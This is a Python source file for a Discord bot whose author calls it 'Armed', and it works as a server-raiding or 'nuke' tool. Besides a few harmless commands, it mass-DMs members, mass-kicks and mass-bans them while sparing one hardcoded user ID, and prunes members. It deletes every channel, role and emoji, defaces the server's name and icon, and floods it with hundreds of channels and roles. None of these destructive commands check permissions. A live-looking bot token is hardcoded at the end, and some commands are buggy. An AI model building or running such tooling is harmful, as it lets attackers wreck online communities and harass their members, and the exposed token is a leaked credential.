#Fuck off :/ Bot Made By AbszG
#Copyright by AbszG :/
#-------------------------------------------------------------------------------
import discord
import youtube_dl
import asyncio
from discord.ext import commands
from discord.ext.commands import Bot , Greedy , guild_only
from discord.voice_client import VoiceClient
import random
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
from youtube_dl import YoutubeDL
from discord import opus
from discord.ext.commands import has_permissions, MissingPermissions
#-------------------------------------------------------------------------------
bot = commands.Bot(command_prefix = 'SP' , case_insensitive=True)
bot.remove_command("help")
print('Lock and Loaded')
print('Armed AF')
print('Let\'s Go Homie')
print('Choose Wisely : sendall , kickall , banall , renameall , fuckup , cmake , rmake , delrole , delchannel , send , deleteall , leavesv , sin , svp ')
#-------------------------------------------------------------------------------
@bot.command()
async def join(ctx):
    channel = ctx.author.voice.channel
    await channel.connect()
    print('Connected to Voice Channel')
    embed= discord.Embed(title="Join", description="Successfuly Connected " , color = 0xd1bc23 )
    await ctx.send(embed = embed)

@bot.command()
async def leave(ctx):
    channel = ctx.author.voice.channel
    await channel.disconnect()
    await print('Disconnected from Voice Channel')
    embed= discord.Embed(title="Disconnect", description="Successfuly Disconnected " , color = 0xd1bc23 )
    await ctx.send(embed = embed)


@bot.command()
async def kick(ctx , member : discord.Member , * , reason=None):
    await member.kick(reason=reason)
    await ctx.send('Kicked Successfuly')

@bot.command()
async def ban(ctx , member : discord.Member , * , reson=None):
    await member.ban(reason=reason)
    await ctx.send('Banned Successfuly')

@bot.command()
async def creator(ctx):
    embed=discord.Embed(title="Creator",description='Man tavasote AbszG sakhte Shodam Koskesha', color= 0xd1bc23)
    await ctx.send(embed = embed)

@bot.command()
async def about(ctx):
    embed=discord.Embed(title="About",description='This Bot Can do Everything such as Moderation, Fun, Music Play and More ...\nCreator CodeName : Spectre', color= 0xd1bc23)
    await ctx.send(embed = embed)
    print('Sent')

@bot.command()
async def ping(ctx):
    embed=discord.Embed(title="Ping",description='Pong xD', color= 0xd1bc23)
    await ctx.send(embed = embed)
    print('Sent')

@bot.command()
async def hi(ctx):
    embed=discord.Embed(title="Hi",description='Yo Bitch ;)', color= 0xd1bc23)
    await ctx.send(embed = embed)
    print('Sent')

@bot.command()
async def help(ctx):
    embed= discord.Embed(title="Help", description="hi\nping\nfun\ninvite\nban [member]\nkick [member]\nMore Later ;)" , color = 0xd1bc23 )
    await ctx.send(embed = embed)

@bot.command()
async def fun(ctx):
    await ctx.send('saleh\naria\nmehdi\nreza\nabbas\nfuck')

@bot.command()
async def invite(ctx):
    await ctx.send('So You Want My Invite Link :D Here You Go:\nhttps://discordapp.com/oauth2/authorize?client_id=631497869169524756&permissions=1916267615&scope=bot ')

#-------------------------------------------------------------------------------

@bot.command(pass_context=True)
async def ccmake(ctx):
    i = 1
    channel = bot.get_channel(710236443947040924)
    await ctx.message.delete()
    while i !=0  :
        await channel.edit(name = 'H')

        await channel.edit(name = 'He')

        await channel.edit(name = 'Hel')

        await channel.edit(name = 'Hell')

        await channel.edit(name = 'Hello')
        time.sleep(3)
#-------------------------------------------------------------------------------
OPUS_LIBS = ['libopus-0.x86.dll', 'libopus-0.x64.dll', 'libopus-0.dll', 'libopus.so.0', 'libopus.0.dylib']


def load_opus_lib(opus_libs=OPUS_LIBS):
    if opus.is_loaded():
        return True

    for opus_lib in opus_libs:
        try:
            opus.load_opus(opus_lib)
            return
        except OSError:
            pass

        raise RuntimeError('Could not load an opus lib. Tried %s' % (', '.join(opus_libs)))
#-------------------------------------------------------------------------------
@bot.command()
async def musicloop(ctx):
    voice_client = ctx.author.voice.channel
    source = discord.FFmpegPCMAudio('Alan-Walker-The-Spectre-320.mp3' , executable='ffmpeg')
    await voice_client.play(source)
    print('Now Playing')
    embed= discord.Embed(title="Music Loop", description="Now Playing" , color = 0xd1bc23 )
    await ctx.send(embed = embed)
#-------------------------------------------------------------------------------
@bot.command(pass_context=True)
async def sendall(ctx, *, message):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.send(message)
            print(f"{user.name} has recieved the message.")
        except:
            print(f"{user.name} has NOT recieved the message.")
    print("Action Completed: Send All")

@bot.command()
async def chsend(ctx , * , message):
    channel = bot.get_channel(710236443947040923)
    await channel.send(str(message))
    print('Done Sending')
    embed= discord.Embed(title="Channel Send", description="Message Sent to Specific Channel" , color = 0x19D332 )
    await ctx.send(embed = embed)

@bot.command(pass_context=True)
async def cmake(ctx):
    countc = 0
    countc_all = 5
    channel = ctx.message.guild
    await ctx.message.delete()
    while countc <= countc_all:
        await channel.create_voice_channel(name = '#Hail_Spectre_Forever' , user_limit= 1)
        countc += 1
        print("Channel Created")
    else:
        print("Failed to Create Channel")

@bot.command(create_text_channel=True)
async def rmake(ctx):
    countr = 0
    countr_max = 5
    roless = ctx.guild
    await ctx.message.delete()
    while countr <= countr_max:
        await roless.create_role(name="#Hail_Spectre_Forever" , colour = discord.Colour(0xFF0000))
        countr += 1
        print("Role Created")
        await roless.create_role(name="#Hail_Spectre_Forever" , colour = discord.Colour(0xFFD700))
        countr += 1
        print("Role Created")
        await roless.create_role(name="#Hail_Spectre_Forever" , colour = discord.Colour(0x00FF00))
        countr += 1
        print("Role Created")
        await roless.create_role(name="#Hail_Spectre_Forever" , colour = discord.Colour(0x00FFFF))
        countr += 1
        print("Role Created")
        await roless.create_role(name="#Hail_Spectre_Forever" , colour = discord.Colour(0xFF00FF))
        countr += 1
        print("Role Created")
    else:
        print("Failed to Create Role")


@bot.command()
async def activity(ctx):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="Over you "))
    print('Activity Changed')



@bot.command()
async def sin(ctx):
    with open('SpC.jpg', 'rb') as f:
        icon = f.read()
        server = ctx.message.guild
        await ctx.message.delete()
        await server.edit(name="#Hail_Spectre_Forever",icon=icon)
        print('Changed Server Image and Name')

@bot.command(pass_context=True)
async def rgb(ctx):
    rgbc = 1
    rolec = discord.utils.get(ctx.guild.roles , name='RGB')
    await ctx.message.delete()
    while rgbc !=0:
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x1e90ff))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xff69b4))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xdeb887))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x030303))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xff00ff))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x00bfff))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x808080))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x00ff00))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x8a2be2))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x5a6346))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x800080))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x0000ff))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xbdb76b))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x7fff00))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x8b008b))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x6495ed))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x00ced1))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xdcdcdc))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x32cd32))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x882d17))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xa52a2a))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xb22222))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x013220))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xff6347))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xffa500))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x008b8b))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xd2691e))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xdaa520))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xd8bfd8))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x000080))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xff8c00))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x990000))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xadff2f))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x7289da))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xff0000))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x228b22))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xffd700))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x351111))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xa2fafb))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x4b0082))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x00eafd))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x605d63))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xd2b48c))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x800000))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0x9400d3))
        time.sleep(1)
        await rolec.edit(name = "RGB" , colour = discord.Colour(0xbfff00))
        time.sleep(1)

@bot.command()
async def svp(ctx):
    reason = 'Hail_Spectre_Forever'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.prune_members(days = 1 , reason = reason)
            print(f"{user.name} Pruned From {ctx.guild.name}")
        except:
            print(f"{user.name} Didn't Prune From {ctx.guild.name}")

@bot.command(pass_context=True)
async def delchannel(ctx):
    await ctx.message.delete()
    for dchannel in list(ctx.guild.channels):
        try:
            await dchannel.delete()
            print (f"{dchannel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{dchannel.name} has NOT been deleted in {ctx.guild.name}")


@bot.command(pass_context=True)
async def delrole(ctx):
    await ctx.message.delete()
    for drole in list(ctx.guild.roles):
        try:
            await drole.delete()
            print (f"{drole.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{drole.name} has NOT been deleted in {ctx.guild.name}")

@bot.command(pass_context=True)
async def leavesv(ctx):
    await ctx.message.delete()
    to_leave = bot.get_guild(id)
    await to_leave.leave()
    print('Left the Server')

@bot.command()
async def send(ctx, users: commands.Greedy[discord.Member], *, message):
    for user in users:
        await user.send(message)
        print(f"{user.name} has recieved the message.")
    else:
        print(f"{user.name} has NOT recieved the message.")

    print("Action Completed: Send ")

@bot.command(pass_context=True)
async def renameall(ctx, rename_to):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=rename_to)
            print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
    print ("Action Completed: Rename All")

@bot.command(pass_context=True)
async def deleteall(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")

        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")

        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
              print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

    print ("Action Completed: Delete All")


@bot.command(pass_context=True)
async def kickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
    print ("Action Completed: kickall")

@bot.command(pass_context=True)
@commands.has_role("Admin")
async def addrole(ctx):
    member = ctx.message.author
    role = get(member.server.roles, name="Test")
    await bot.add_roles(member, role)


@bot.command(pass_context=True)
async def banall(ctx):
    await ctx.message.delete()
    immune = bot.get_user(365424707526197249)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            await ctx.guild.unban(immune)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print ("Action Completed: ball")

@bot.command(pass_context=True)
async def fuckup(ctx):
    await ctx.message.delete()
    immune = bot.get_user(365424707526197249)
    for user in list(ctx.guild.members):
        try :
            await ctx.guild.ban(user)
            await ctx.guild.unban(immune)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

    with open('SpC.jpg', 'rb') as f:
        icon = f.read()
        server = ctx.message.guild
        await server.edit(name="Fuck" , icon=icon)
        print('Changed Server Image and Name')

    count2 = 0
    max_count2 = 400
    chmake = ctx.message.guild
    while count2 <= max_count2:
        await chmake.create_voice_channel(name='Fuck' , user_limit= 1)
        count2 += 1
        print("Channel Created")
    else:
        print("Failed to Create Channel")

    count1 = 0
    max_count1 = 200
    rolesss = ctx.guild
    while count1 <= max_count1:
        await rolesss.create_role(name="#Fuck" , colour = discord.Colour(0xFF0000))
        count1 += 1
        print("Role Created")
        await rolesss.create_role(name="#Fuck" , colour = discord.Colour(0xFFD700))
        count1 += 1
        print("Role Created")
        await rolesss.create_role(name="#Fuck" , colour = discord.Colour(0x00FF00))
        count1 += 1
        print("Role Created")
        await rolesss.create_role(name="#Fuck" , colour = discord.Colour(0x00FFFF))
        count1 += 1
        print("Role Created")
        await rolesss.create_role(name="#Fuck" , colour = discord.Colour(0xFF00FF))
        count1 += 1
        print("Role Created")
    else:
        print("Failed to Create Role")


    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

    print ("Action Completed: Fuckup")



bot.run('NjMxNDk3ODY5MTY5NTI0NzU2.XZ3uvQ.gebZjtkClh3J15euPncaBg7TTEQ')
